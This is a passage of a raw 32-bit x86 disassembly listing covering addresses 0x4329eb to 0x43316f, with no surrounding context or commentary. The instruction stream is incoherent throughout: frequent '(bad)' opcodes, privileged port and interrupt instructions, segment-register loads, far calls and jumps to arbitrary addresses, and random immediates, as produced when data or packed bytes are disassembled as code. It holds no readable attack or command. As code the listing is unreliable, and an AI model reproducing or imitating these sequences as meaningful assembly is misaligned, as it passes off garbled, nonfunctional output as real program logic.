  4329eb:	gs ja  0x4329be
  4329ee:	pop    edx
  4329ef:	dec    esi
  4329f0:	or     DWORD PTR [ecx],eax
  4329f2:	loopne 0x4329ed
  4329f4:	jbe    0x4329bd
  4329f6:	inc    esp
  4329f7:	test   eax,0xa2b8436f
  4329fc:	mov    ds,WORD PTR ds:0xed9e0883
  432a02:	ret    
  432a03:	xor    al,0xf8
  432a05:	and    BYTE PTR [ecx-0x5e],0xb4
  432a09:	int3   
  432a0a:	iret   
  432a0b:	int    0x89
  432a0d:	push   0x3
  432a0f:	test   BYTE PTR [ebp+0x42],bh
  432a12:	pop    ecx
  432a13:	stos   DWORD PTR es:[edi],eax
  432a14:	nop
  432a15:	sar    DWORD PTR [eax-0x58e0692f],1
  432a1b:	aad    0x92
  432a1d:	adc    esi,edx
  432a1f:	shl    DWORD PTR [ebp+0x7059a405],1
  432a25:	test   al,0xb5
  432a27:	std    
  432a28:	daa    
  432a29:	js     0x432a49
  432a2b:	cmp    ebp,DWORD PTR [edx-0x64]
  432a2e:	imul   ebp,DWORD PTR [ebx-0x2bafb78c],0x39
  432a35:	add    BYTE PTR ds:0x2d4fdfb0,ah
  432a3b:	pop    esp
  432a3c:	xchg   BYTE PTR [ebx],bl
  432a3e:	sub    BYTE PTR [edi],dh
  432a40:	add    dh,BYTE PTR [ebx+0x1e]
  432a43:	pop    esi
  432a44:	cmp    dh,cl
  432a46:	xor    al,0xd1
  432a48:	stos   DWORD PTR es:[edi],eax
  432a49:	out    dx,al
  432a4a:	inc    edi
  432a4b:	sbb    eax,0x74f2c5cd
  432a50:	nop
  432a51:	mov    DWORD PTR [esi+ebp*4],0x2c57b389
  432a58:	cmp    dh,ch
  432a5a:	or     al,0xe7
  432a5c:	js     0x432a61
  432a5e:	push   edx
  432a5f:	mov    cs,WORD PTR [edx+0x54]
  432a62:	sti    
  432a63:	ficomp WORD PTR [eax]
  432a65:	cdq    
  432a66:	popa   
  432a67:	push   edi
  432a68:	cld    
  432a69:	cli    
  432a6a:	mov    ss,WORD PTR [edx-0x35]
  432a6d:	hlt    
  432a6e:	lock push ds
  432a70:	mov    dl,0x2
  432a72:	push   0x9545916b
  432a77:	ss cs sahf 
  432a7a:	pop    ds
  432a7b:	jne    0x432a0f
  432a7d:	cli    
  432a7e:	jae    0x432adb
  432a80:	lds    ebp,FWORD PTR [esi-0x72]
  432a83:	sbb    al,0x8b
  432a85:	test   DWORD PTR [edi],ebx
  432a87:	xchg   ebx,eax
  432a88:	and    BYTE PTR [ebx+0x797c1abc],0xa6
  432a8f:	xchg   ecx,eax
  432a90:	pop    ebx
  432a91:	jecxz  0x432ab2
  432a93:	test   DWORD PTR [edi-0x5bf94a79],ebx
  432a99:	add    cl,dl
  432a9b:	mov    edx,0xedc628bb
  432aa0:	dec    eax
  432aa1:	jne    0x432ac2
  432aa3:	jns    0x432a84
  432aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432aa6:	ss and al,0xd2
  432aa9:	scas   eax,DWORD PTR es:[edi]
  432aaa:	pop    ebx
  432aab:	aam    0x82
  432aad:	xchg   esp,eax
  432aae:	lods   eax,DWORD PTR cs:[esi]
  432ab0:	in     al,0xf1
  432ab2:	mov    ah,0xe0
  432ab4:	aam    0x7
  432ab6:	xchg   esi,eax
  432ab7:	sub    ecx,esi
  432ab9:	add    eax,0xaca1f087
  432abe:	fst    QWORD PTR [eax+0x7]
  432ac1:	adc    eax,0x2d04855c
  432ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432ac7:	je     0x432a8c
  432ac9:	jbe    0x432a90
  432acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432acc:	xchg   ebp,edi
  432ace:	daa    
  432acf:	xchg   esi,eax
  432ad0:	test   al,0x8f
  432ad2:	add    edx,edx
  432ad4:	js     0x432b23
  432ad6:	aas    
  432ad7:	mov    edi,0xf5318c0f
  432adc:	mov    DWORD PTR [eax],ecx
  432ade:	add    DWORD PTR [eax],0x75
  432ae1:	xor    cl,BYTE PTR [ebx+0x2d21890b]
  432ae7:	test   BYTE PTR [eax+esi*4-0x47],0x55
  432aec:	outs   dx,BYTE PTR ds:[esi]
  432aed:	loop   0x432a82
  432aef:	aam    0xc2
  432af1:	xlat   BYTE PTR ds:[ebx]
  432af2:	pop    esp
  432af3:	sbb    DWORD PTR [ecx],ecx
  432af5:	cs nop
  432af7:	ror    BYTE PTR [eax-0x3762dac5],1
  432afd:	dec    ebp
  432afe:	and    DWORD PTR [ebp-0x4d],esi
  432b01:	add    bh,BYTE PTR [eax]
  432b03:	mov    al,0x2c
  432b05:	scas   eax,DWORD PTR es:[edi]
  432b06:	cmp    BYTE PTR [eax],0x9e
  432b09:	pop    ebp
  432b0a:	xchg   ecx,eax
  432b0b:	add    DWORD PTR [edx+0x5cd48b87],ebx
  432b11:	sti    
  432b12:	inc    esi
  432b13:	stc    
  432b14:	cmp    cl,cl
  432b16:	call   0x7cd5:0x943f6817
  432b1d:	pushf  
  432b1e:	push   esi
  432b1f:	mov    eax,0x7005c18d
  432b24:	mov    DWORD PTR [ebx],ebp
  432b26:	fs cmp al,0x4d
  432b29:	loope  0x432ab8
  432b2b:	cmp    ebp,DWORD PTR [edi]
  432b2d:	add    al,BYTE PTR [esi-0x4d]
  432b30:	jns    0x432ae1
  432b32:	es cdq 
  432b34:	ss pop es
  432b36:	pusha  
  432b37:	jmp    DWORD PTR [edi+ecx*8-0x48]
  432b3b:	or     eax,DWORD PTR [esi+ebx*8+0x5b]
  432b3f:	aad    0x4f
  432b41:	clc    
  432b42:	push   cs
  432b43:	add    edi,esi
  432b45:	adc    ecx,DWORD PTR [esi+ecx*1]
  432b48:	mov    cl,0x71
  432b4a:	(bad)
  432b4e:	xor    eax,0x8a71ae8a
  432b53:	aad    0x5d
  432b55:	pop    edx
  432b56:	outs   dx,BYTE PTR ds:[esi]
  432b57:	xchg   DWORD PTR [ebx],edx
  432b59:	sub    al,0xe9
  432b5b:	lods   al,BYTE PTR ds:[esi]
  432b5c:	mov    BYTE PTR [ebx],bh
  432b5e:	iret   
  432b5f:	xor    eax,0x43d3e7bc
  432b64:	cs daa 
  432b66:	retf   0xadcb
  432b69:	addr16 push ds
  432b6b:	mov    esp,0x9482272a
  432b70:	mov    BYTE PTR [ecx-0x32ed5ee],bl
  432b76:	inc    ebp
  432b77:	cs fxam 
  432b7a:	div    DWORD PTR cs:[ebp+0x72]
  432b7e:	pop    esi
  432b7f:	push   es
  432b80:	mov    BYTE PTR [ecx],dl
  432b82:	jl     0x432bdb
  432b84:	mov    ecx,0x8cf97793
  432b89:	mov    bh,0x57
  432b8b:	enter  0x8c9c,0x34
  432b8f:	push   edi
  432b90:	ins    BYTE PTR es:[edi],dx
  432b91:	aaa    
  432b92:	add    edx,edi
  432b94:	scas   al,BYTE PTR es:[edi]
  432b95:	gs mov ecx,0xf7ad8727
  432b9b:	cli    
  432b9c:	mov    DWORD PTR [ebp-0x41],ecx
  432b9f:	and    esp,DWORD PTR [eax-0x64]
  432ba2:	dec    ecx
  432ba3:	retf   0x1450
  432ba6:	inc    edx
  432ba7:	int3   
  432ba8:	jnp    0x432bd8
  432baa:	jo     0x432b41
  432bac:	add    cl,0x9b
  432baf:	add    al,0x88
  432bb1:	inc    DWORD PTR [esi+0x31533b86]
  432bb7:	xor    esp,edx
  432bb9:	add    eax,0xa43616e0
  432bbe:	pop    ebx
  432bbf:	lods   al,BYTE PTR ds:[esi]
  432bc0:	addr16 push esp
  432bc2:	push   ds
  432bc3:	jmp    0x665edf17
  432bc8:	mov    dl,0xaf
  432bca:	inc    esp
  432bcb:	aad    0xa0
  432bcd:	stos   DWORD PTR es:[edi],eax
  432bce:	ds enter 0xb172,0x9a
  432bd3:	jge    0x432b5e
  432bd5:	lahf   
  432bd6:	icebp  
  432bd7:	dec    edx
  432bd8:	xor    eax,0xd6c93531
  432bdd:	pop    ds
  432bde:	mov    esi,0x6920d456
  432be3:	ins    BYTE PTR es:[edi],dx
  432be4:	retf   0xaf50
  432be7:	sbb    al,0xc0
  432be9:	aas    
  432bea:	push   ds
  432beb:	cdq    
  432bec:	pop    ds
  432bed:	push   0xffffffa9
  432bef:	daa    
  432bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432bf1:	inc    eax
  432bf2:	xchg   ebx,eax
  432bf3:	aam    0x6a
  432bf5:	or     bl,cl
  432bf7:	test   dh,0xe8
  432bfa:	rcr    BYTE PTR [edx],1
  432bfc:	js     0x432bb7
  432bfe:	pop    edx
  432bff:	jmp    0xcf626650
  432c04:	das    
  432c05:	dec    esp
  432c06:	and    al,0x1d
  432c08:	outs   dx,DWORD PTR ds:[esi]
  432c09:	add    dh,BYTE PTR [esi-0x31f17093]
  432c0f:	test   eax,0xdb1e5551
  432c14:	div    dl
  432c16:	push   ecx
  432c17:	push   cs
  432c18:	sahf   
  432c19:	outs   dx,BYTE PTR ds:[esi]
  432c1a:	rcl    edx,0x45
  432c1d:	sti    
  432c1e:	and    ecx,ebx
  432c20:	inc    ecx
  432c21:	scas   al,BYTE PTR es:[edi]
  432c22:	jno    0x432c00
  432c24:	(bad)  
  432c25:	div    BYTE PTR gs:[ebp-0x79]
  432c29:	adc    eax,0x7ea04398
  432c2e:	push   DWORD PTR [edx-0x10]
  432c31:	xchg   BYTE PTR [eax-0x73cd1d2c],cl
  432c37:	int    0x4a
  432c39:	mov    bl,0xa4
  432c3b:	jge    0x432bc6
  432c3d:	lds    edx,FWORD PTR [edi]
  432c3f:	mov    esp,0xf2d8038d
  432c44:	mov    ds:0xad994602,eax
  432c49:	xor    DWORD PTR [edi+esi*1-0x50],0x19
  432c4e:	arpl   di,bx
  432c50:	jg     0x432c0b
  432c52:	mov    ds:0xc061234,eax
  432c57:	shl    edx,1
  432c59:	enter  0x97ae,0x95
  432c5d:	test   DWORD PTR [edx],ebp
  432c5f:	mov    WORD PTR [eax+esi*4+0x7c],?
  432c63:	add    ebx,DWORD PTR [ebx-0xf2b2cf3]
  432c69:	lods   al,BYTE PTR ds:[esi]
  432c6a:	scas   eax,DWORD PTR es:[edi]
  432c6b:	xadd   DWORD PTR [eax+ebx*1],edi
  432c6f:	loop   0x432c40
  432c71:	add    eax,0x45de1cf2
  432c76:	pop    esp
  432c77:	push   esi
  432c78:	addr16 dec edx
  432c7a:	xlat   BYTE PTR ds:[ebx]
  432c7b:	ret    
  432c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432c7d:	add    dl,BYTE PTR [edx-0x4c]
  432c80:	(bad)  
  432c81:	lock mov esi,0x6005d0e
  432c87:	sbb    ch,BYTE PTR [eax-0xbc74ff2]
  432c8d:	ret    0x8a5f
  432c90:	mov    DWORD PTR [ecx-0x3],esp
  432c93:	mov    DWORD PTR [ecx+0x50],eax
  432c96:	imul   esp,DWORD PTR [eax+edi*8],0x1e5b7c27
  432c9d:	mov    edx,0x2f46efe
  432ca2:	jbe    0x432cf7
  432ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432ca5:	call   0x2b63:0x887626ac
  432cac:	mov    dl,bh
  432cae:	or     BYTE PTR [edx+0x290bc3e8],bl
  432cb4:	pusha  
  432cb5:	pop    es
  432cb6:	(bad)  
  432cb8:	mov    DWORD PTR [esi],edi
  432cba:	push   ebp
  432cbb:	cmp    DWORD PTR [esi],ebx
  432cbd:	in     al,0xa1
  432cbf:	xchg   esp,eax
  432cc0:	xor    esi,ebp
  432cc2:	pop    ds
  432cc3:	cdq    
  432cc4:	sub    ebp,DWORD PTR [eax-0x7bda394]
  432cca:	adc    esp,0xfffffff1
  432ccd:	cli    
  432cce:	out    dx,al
  432ccf:	sahf   
  432cd0:	xor    eax,0x8939c861
  432cd5:	pop    edi
  432cd6:	repnz loopne 0x432d1a
  432cd9:	jge    0x432d59
  432cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432cdc:	ins    BYTE PTR es:[edi],dx
  432cdd:	push   esi
  432cde:	idiv   bh
  432ce0:	jae    0x432cf6
  432ce2:	aam    0xff
  432ce4:	sar    BYTE PTR [edi],1
  432ce6:	xchg   esi,eax
  432ce7:	jne    0x432cc2
  432ce9:	sahf   
  432cea:	push   cs
  432ceb:	push   ebx
  432cec:	mov    BYTE PTR [edi],dh
  432cee:	icebp  
  432cef:	pushf  
  432cf0:	hlt    
  432cf1:	ds jo  0x432c84
  432cf4:	nop    DWORD PTR [eax-0xbd000e2]
  432cfb:	or     eax,0x3d7c0959
  432d00:	lock idiv edi
  432d03:	pushf  
  432d04:	(bad)  
  432d05:	mov    edi,0x2ed3e1f
  432d0a:	inc    ebp
  432d0b:	ret    0x585
  432d0e:	loopne 0x432ce9
  432d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432d11:	enter  0xf213,0x6a
  432d15:	stos   DWORD PTR es:[edi],eax
  432d16:	pusha  
  432d17:	fld    QWORD PTR [edx+esi*1+0x5f]
  432d1b:	pop    ecx
  432d1c:	out    0x86,al
  432d1e:	xchg   edi,eax
  432d1f:	aad    0x5e
  432d21:	or     dl,bh
  432d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432d24:	(bad)  
  432d25:	sbb    bh,BYTE PTR [ecx-0x2840778e]
  432d2b:	lea    edx,[edx+eiz*8]
  432d2e:	inc    ecx
  432d2f:	or     eax,DWORD PTR [edi-0x5d]
  432d32:	jg     0x432ce7
  432d34:	dec    ecx
  432d35:	in     eax,dx
  432d36:	xor    BYTE PTR [edi],dl
  432d38:	outs   dx,BYTE PTR ds:[esi]
  432d39:	idiv   DWORD PTR ds:0xb81c53d4
  432d3f:	push   es
  432d40:	or     al,al
  432d42:	jae    0x432d81
  432d44:	lea    edx,[ebx+0xee6ecb4]
  432d4a:	or     eax,0x30d85c54
  432d4f:	lahf   
  432d50:	pop    edx
  432d51:	add    al,0xaf
  432d53:	push   ebp
  432d54:	jae    0x432dcc
  432d56:	fstp   QWORD PTR [esi+0x5f]
  432d59:	stos   BYTE PTR es:[edi],al
  432d5a:	xchg   edx,eax
  432d5b:	(bad)  
  432d5c:	xchg   esp,eax
  432d5d:	xchg   edx,eax
  432d5e:	rcl    ah,1
  432d60:	cmc    
  432d61:	(bad)  
  432d62:	stc    
  432d63:	and    eax,0x9e28a31c
  432d68:	loop   0x432d22
  432d6a:	inc    ecx
  432d6b:	(bad)  
  432d6c:	mov    ebp,edi
  432d6e:	dec    edx
  432d6f:	fwait
  432d70:	js     0x432d66
  432d72:	xchg   BYTE PTR [eax+ecx*4-0x5f],al
  432d76:	fs cmp eax,0xfcc412f5
  432d7c:	out    dx,al
  432d7d:	jmp    0x432d5f
  432d7f:	mov    dh,ch
  432d81:	add    eax,0x75cea0ce
  432d86:	mov    edi,0x7dd65dbc
  432d8b:	repz addr16 push 0x5e881e50
  432d92:	aas    
  432d93:	in     eax,dx
  432d94:	cld    
  432d95:	div    ah
  432d97:	aad    0x43
  432d99:	jp     0x432d65
  432d9b:	lods   al,BYTE PTR ds:[esi]
  432d9c:	or     al,0x23
  432d9e:	sbb    BYTE PTR gs:[edi+ebp*2+0x1e],0x87
  432da4:	je     0x432df0
  432da6:	mov    ebp,0xf0fb4e19
  432dab:	fnstsw WORD PTR [ebp+eax*1+0x29d9fb8e]
  432db2:	lods   eax,DWORD PTR ds:[esi]
  432db3:	aas    
  432db4:	mov    edi,0x75031e71
  432db9:	mov    ecx,0x191a7ad8
  432dbe:	in     eax,0xd5
  432dc0:	out    dx,eax
  432dc1:	mov    eax,ds:0x65a0d68e
  432dc6:	push   es
  432dc7:	out    dx,al
  432dc8:	ja     0x432d56
  432dca:	pop    ds
  432dcb:	jecxz  0x432e26
  432dcd:	adc    al,0x2a
  432dcf:	int    0xba
  432dd1:	adc    eax,0x555d58e
  432dd6:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432dd8:	aam    0x31
  432dda:	jl     0x432e5b
  432ddc:	(bad)  
  432ddd:	mov    ebx,0x614b7652
  432de2:	and    eax,0x1dbd909a
  432de7:	aam    0x34
  432de9:	xor    eax,0xa828e69d
  432dee:	xchg   edx,eax
  432def:	pusha  
  432df0:	sahf   
  432df1:	inc    ebx
  432df2:	call   0x5e17:0xbe0308bb
  432df9:	std    
  432dfa:	cmc    
  432dfb:	aam    0x27
  432dfd:	fisubr DWORD PTR [edx]
  432dff:	jmp    0x13487280
  432e04:	mov    ebx,edi
  432e06:	sbb    eax,0x584b303e
  432e0b:	and    eax,0x34300327
  432e10:	add    ch,BYTE PTR [edx]
  432e12:	jns    0x432daf
  432e14:	inc    ecx
  432e15:	ret    
  432e16:	push   cs
  432e17:	jp     0x432da2
  432e19:	or     DWORD PTR [esi+0xf6be5c4],eax
  432e1f:	jns    0x432e1b
  432e21:	adc    al,0x5a
  432e23:	pop    ds
  432e24:	pop    edi
  432e25:	xchg   ebp,eax
  432e26:	(bad)  
  432e27:	xchg   edi,eax
  432e28:	int    0x23
  432e2a:	js     0x432e20
  432e2c:	and    ah,BYTE PTR [edi+0x2d87fa16]
  432e32:	dec    ebp
  432e33:	mov    edi,DWORD PTR [ebp+0x3075fe25]
  432e39:	div    DWORD PTR [eax+0x7daf68d4]
  432e3f:	inc    eax
  432e40:	add    eax,0x77ef841f
  432e45:	js     0x432e66
  432e47:	lods   eax,DWORD PTR ds:[esi]
  432e48:	jb     0x432ec1
  432e4a:	and    eax,0x285392e4
  432e4f:	xlat   BYTE PTR ds:[ebx]
  432e50:	dec    ebx
  432e51:	mov    edx,0x1e50e15b
  432e56:	push   ebp
  432e57:	scas   al,BYTE PTR es:[edi]
  432e58:	mov    ecx,ecx
  432e5a:	xchg   esi,eax
  432e5b:	in     al,0xb9
  432e5d:	fs cmp eax,0x681d7715
  432e63:	jl     0x432e3d
  432e65:	fiadd  DWORD PTR [ebp+edi*4+0xe6a1509]
  432e6c:	(bad)  
  432e6d:	jecxz  0x432e27
  432e6f:	mov    BYTE PTR [edx-0x59],cl
  432e72:	cmp    al,0x36
  432e74:	mov    al,0x79
  432e76:	out    dx,eax
  432e77:	and    dl,bl
  432e79:	add    bh,al
  432e7b:	fisub  WORD PTR [edx-0x55]
  432e7e:	fcom   QWORD PTR [ebp+0x1b]
  432e81:	adc    dl,BYTE PTR [ebx]
  432e83:	mov    ds:0x41bca595,eax
  432e88:	jo     0x432e8c
  432e8a:	jae    0x432e99
  432e8c:	sar    BYTE PTR [esi-0x14b12aa4],cl
  432e92:	inc    DWORD PTR [edi+0x38]
  432e95:	jne    0x432e3f
  432e97:	std    
  432e98:	mov    BYTE PTR [ebx+0x41],cl
  432e9b:	add    edx,0x3e4e1340
  432ea1:	sbb    eax,0x27483644
  432ea6:	pop    ecx
  432ea7:	icebp  
  432ea8:	mov    ?,eax
  432eaa:	shl    BYTE PTR [eax],cl
  432eac:	push   edx
  432ead:	ficom  DWORD PTR [eax-0x2d140653]
  432eb3:	aad    0xf1
  432eb5:	inc    edi
  432eb6:	mov    ds:0x7bc1a8c8,eax
  432ebb:	(bad)  
  432ebc:	jg     0x432e43
  432ebe:	sbb    ax,0x9658
  432ec2:	rol    ebp,0x73
  432ec5:	aad    0x66
  432ec7:	addr16 dec eax
  432ec9:	sar    BYTE PTR [eax-0x5b3c7e44],cl
  432ecf:	add    cl,BYTE PTR [eax-0x3bff111e]
  432ed5:	icebp  
  432ed6:	out    0x30,al
  432ed8:	cmp    BYTE PTR [ebp+0x23],0x6a
  432edc:	ret    
  432edd:	sub    ebx,DWORD PTR [edi]
  432edf:	jo     0x432e75
  432ee1:	jp     0x432f05
  432ee3:	xlat   BYTE PTR ds:[ebx]
  432ee4:	pop    es
  432ee5:	mov    esp,0x6b0c0fbf
  432eea:	push   0xebc98818
  432eef:	popa   
  432ef0:	push   esp
  432ef1:	push   esi
  432ef2:	outs   dx,BYTE PTR ds:[esi]
  432ef3:	sar    DWORD PTR [ebp-0x5991fa4b],1
  432ef9:	cmp    eax,0xe911d4a3
  432efe:	mov    cl,0x73
  432f00:	mov    ebx,0x150b60fd
  432f05:	cmp    edx,esp
  432f07:	retf   
  432f08:	into   
  432f09:	(bad)  
  432f0a:	sbb    ebx,DWORD PTR [ebp+ebx*1-0x60aaa041]
  432f11:	inc    ecx
  432f12:	sar    BYTE PTR [edx-0x14],0x31
  432f16:	pop    ds
  432f17:	ret    
  432f18:	lods   al,BYTE PTR ds:[esi]
  432f19:	je     0x432f87
  432f1b:	test   BYTE PTR [edx-0x5c],cl
  432f1e:	mov    ss,esp
  432f20:	imul   esi,ecx,0x7c
  432f23:	in     eax,dx
  432f24:	sub    DWORD PTR [esp+esi*1],ebx
  432f27:	popf   
  432f28:	dec    ecx
  432f29:	mov    ds:0xc1bbf768,eax
  432f2e:	push   esp
  432f2f:	inc    ebx
  432f30:	xchg   BYTE PTR [edx-0x1c],al
  432f33:	adc    al,0xe2
  432f35:	ror    esi,cl
  432f37:	fs js  0x432f99
  432f3a:	arpl   ax,bx
  432f3c:	popf   
  432f3d:	adc    al,0xa
  432f3f:	sbb    DWORD PTR [ebx],eax
  432f41:	xchg   edx,eax
  432f42:	inc    esi
  432f43:	xor    al,0xd5
  432f45:	sbb    eax,esi
  432f47:	lock mov DWORD PTR [edi],ebx
  432f4a:	repz or ah,BYTE PTR [ebx]
  432f4d:	repnz popa 
  432f4f:	jge    0x432f95
  432f51:	daa    
  432f52:	cwde   
  432f53:	aas    
  432f54:	cmc    
  432f55:	pop    edi
  432f56:	pop    esi
  432f57:	dec    ecx
  432f58:	adc    BYTE PTR [ebp+0x6f8cc8ad],dl
  432f5e:	sbb    eax,DWORD PTR [ecx+0x21]
  432f61:	jg     0x432fb7
  432f63:	push   ebp
  432f64:	adc    al,0xa4
  432f66:	push   esi
  432f67:	aam    0x13
  432f69:	mov    dl,0x3c
  432f6b:	aam    0xb0
  432f6d:	daa    
  432f6e:	sbb    BYTE PTR ds:0xd4c8c5fe,cl
  432f74:	add    eax,0x22cc06aa
  432f79:	adc    DWORD PTR [edx-0x2b624556],edi
  432f7f:	mov    edx,DWORD PTR [edx]
  432f81:	adc    al,0x48
  432f83:	jne    0x432fd2
  432f85:	cwde   
  432f86:	xor    al,0xb7
  432f88:	mov    BYTE PTR [ebp-0x35],cl
  432f8b:	popf   
  432f8c:	mov    eax,ss
  432f8e:	loopne 0x432f44
  432f90:	out    0x5,al
  432f92:	out    dx,al
  432f93:	fst    DWORD PTR [esi]
  432f95:	js     0x432fa7
  432f97:	mov    edi,0x2b1e7d26
  432f9c:	imul   esp,esi,0x3e1a5772
  432fa2:	sti    
  432fa3:	mov    edx,0x7dd5c8f2
  432fa8:	leave  
  432fa9:	mov    DWORD PTR [eax+0x69],0xe59bd567
  432fb0:	adc    al,0x92
  432fb2:	out    0xd5,al
  432fb4:	push   0xfee39250
  432fb9:	xor    BYTE PTR [eax-0x2a],0xf8
  432fbd:	xchg   esp,eax
  432fbe:	mov    esi,0xd77d6817
  432fc3:	hlt    
  432fc4:	add    esp,esp
  432fc6:	popa   
  432fc7:	mov    cl,0x76
  432fc9:	pop    ecx
  432fca:	and    bh,ch
  432fcc:	popa   
  432fcd:	fdivr  QWORD PTR [edi]
  432fcf:	mov    dh,0x53
  432fd1:	sub    esi,DWORD PTR [eax+0x5b]
  432fd4:	push   edi
  432fd5:	int    0x5b
  432fd7:	xchg   edx,eax
  432fd8:	mov    al,0x93
  432fda:	aad    0x2c
  432fdc:	or     BYTE PTR [ebp-0x70],ah
  432fdf:	scas   al,BYTE PTR es:[edi]
  432fe0:	test   al,0xdb
  432fe2:	adc    ch,0xfd
  432fe5:	add    BYTE PTR [ebp+0x4e],0x6a
  432fe9:	pop    edi
  432fea:	dec    eax
  432feb:	push   cs
  432fec:	mov    edi,DWORD PTR [ebp+0x7b444c08]
  432ff2:	cmp    eax,0x6c275003
  432ff7:	aad    0x8
  432ff9:	mov    ds:0x98829c59,eax
  432ffe:	into   
  432fff:	add    cl,BYTE PTR [eax+0x6ddaaa97]
  433005:	ret    0x1679
  433008:	sahf   
  433009:	pop    ds
  43300a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43300b:	xor    dh,bl
  43300d:	ret    
  43300e:	les    ebx,FWORD PTR [ebx]
  433010:	mov    DWORD PTR [esi+ecx*2],edi
  433013:	out    dx,eax
  433014:	test   eax,0x5876392
  433019:	mov    dh,0xda
  43301b:	cmp    BYTE PTR [esi-0xd8bfa21],0xc6
  433022:	cwde   
  433023:	aam    0xb2
  433025:	jg     0x432fd9
  433027:	pop    ss
  433028:	push   eax
  433029:	sbb    al,BYTE PTR [edi]
  43302b:	lods   al,BYTE PTR ds:[esi]
  43302c:	xchg   ebp,eax
  43302d:	xchg   DWORD PTR [edx],edx
  43302f:	jbe    0x432ffb
  433031:	inc    edx
  433032:	sub    esp,DWORD PTR fs:[eax+edi*8]
  433036:	lods   al,BYTE PTR ds:[esi]
  433037:	aam    0x84
  433039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43303a:	dec    ecx
  43303b:	push   ds
  43303c:	pop    ebx
  43303d:	jbe    0x43307e
  43303f:	mov    BYTE PTR [ebp+0x1d],dl
  433042:	pop    ds
  433043:	(bad)  
  433044:	adc    eax,DWORD PTR [edi+0x6c]
  433047:	ret    0xf6e8
  43304a:	out    dx,eax
  43304b:	aad    0x7
  43304d:	inc    esi
  43304e:	xchg   ecx,eax
  43304f:	mov    bh,0xe4
  433051:	(bad)  
  433052:	and    ebx,0xda533388
  433058:	mov    esp,0x72452843
  43305d:	sub    eax,0xc401f1f0
  433062:	pusha  
  433063:	sub    eax,0x5d2ee235
  433068:	xchg   esi,eax
  433069:	sub    DWORD PTR [edx-0x78],esp
  43306c:	or     BYTE PTR [edx],al
  43306e:	adc    al,bl
  433070:	test   al,0xa0
  433072:	dec    ebx
  433073:	mov    ds:0xab6bce4e,al
  433078:	mov    DWORD PTR [ebp-0x53],ebp
  43307b:	push   esi
  43307c:	lahf   
  43307d:	or     al,0x60
  43307f:	fwait
  433080:	sbb    DWORD PTR [ebx-0x493baaa2],esi
  433086:	sbb    al,0xd4
  433088:	js     0x433090
  43308a:	adc    al,0x7b
  43308c:	out    dx,eax
  43308d:	ins    BYTE PTR es:[edi],dx
  43308e:	sub    DWORD PTR [edx-0x4d],esi
  433091:	cmp    DWORD PTR [edi+ebp*8],esp
  433094:	or     DWORD PTR [eax],ebp
  433096:	int    0x9e
  433098:	mov    al,ds:0x5fd5a4b9
  43309d:	inc    ebx
  43309e:	std    
  43309f:	jl     0x4330de
  4330a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4330a2:	push   ebp
  4330a3:	jns    0x43302e
  4330a5:	jne    0x433093
  4330a7:	push   ecx
  4330a8:	scas   al,BYTE PTR es:[edi]
  4330a9:	xor    DWORD PTR [eax-0x75],edx
  4330ac:	lods   al,BYTE PTR ds:[esi]
  4330ad:	add    eax,0xc1c4ca6
  4330b2:	mov    cl,0x2c
  4330b4:	inc    edi
  4330b5:	imul   ebx,DWORD PTR [edi],0x4ca05da9
  4330bb:	(bad)  
  4330bc:	call   0x4416fbd6
  4330c1:	jbe    0x433095
  4330c3:	in     al,0x5e
  4330c5:	jnp    0x433096
  4330c7:	cwde   
  4330c8:	pop    DWORD PTR [ecx]
  4330ca:	pop    ds
  4330cb:	xchg   DWORD PTR [ebx-0x54],ebp
  4330ce:	aaa    
  4330cf:	push   esi
  4330d0:	jmp    0xe2ee:0x87d59470
  4330d7:	jo     0x4330e8
  4330d9:	mov    bh,0x91
  4330db:	mov    eax,0x66cf0589
  4330e0:	fsub   DWORD PTR [edx-0x74]
  4330e3:	mov    bh,0xd6
  4330e5:	add    dh,BYTE PTR [ecx*4-0x21c6589f]
  4330ec:	mov    ds:0x2611601c,eax
  4330f1:	loope  0x43316c
  4330f3:	psrlw  mm3,QWORD PTR [edx]
  4330f6:	cmp    BYTE PTR [ebx-0x5afe50d8],dh
  4330fc:	cmp    al,0x88
  4330fe:	or     al,0x6f
  433100:	push   esp
  433101:	xor    BYTE PTR [esi],0xe8
  433104:	inc    ebp
  433105:	(bad)  
  433106:	popf   
  433107:	aaa    
  433108:	jno    0x43310c
  43310a:	sbb    eax,0x85b366b7
  43310f:	sub    DWORD PTR [edx-0x8],edi
  433112:	mov    bh,0xd5
  433114:	cwde   
  433115:	lea    ebx,[edx]
  433117:	stos   BYTE PTR es:[edi],al
  433118:	mov    ebp,0x9fbc307e
  43311d:	aas    
  43311e:	mov    edi,0x202ebd2
  433123:	shl    bl,1
  433125:	mov    ch,0x66
  433127:	cmp    eax,0x4b608fb5
  43312c:	cmp    DWORD PTR [esi-0x2e],edi
  43312f:	ja     0x433156
  433131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433132:	pusha  
  433133:	jg     0x433105
  433135:	hlt    
  433136:	xchg   DWORD PTR [ebx+0x70],edx
  433139:	jae    0x4330bc
  43313b:	sahf   
  43313c:	ss mov ch,0x58
  43313f:	aad    0xb8
  433141:	addr16 mov bl,cl
  433144:	not    DWORD PTR [edi+0x1]
  433147:	loopne 0x4330d1
  433149:	aad    0x5b
  43314b:	data16 mov bl,0xbc
  43314e:	aam    0x21
  433150:	cmp    al,0x27
  433152:	adc    al,0xe6
  433154:	jmp    0x433154
  433156:	pop    ebx
  433157:	push   ebp
  433158:	rol    DWORD PTR [edx-0x3a],cl
  43315b:	xor    eax,0x784e1f67
  433160:	mov    bl,bh
  433162:	mov    esi,0x7f2b4901
  433167:	mov    gs,WORD PTR [ebx+0x3]
  43316a:	push   0xec6b6f48
  43316f:	lods   eax,DWORD PTR ds:[esi]
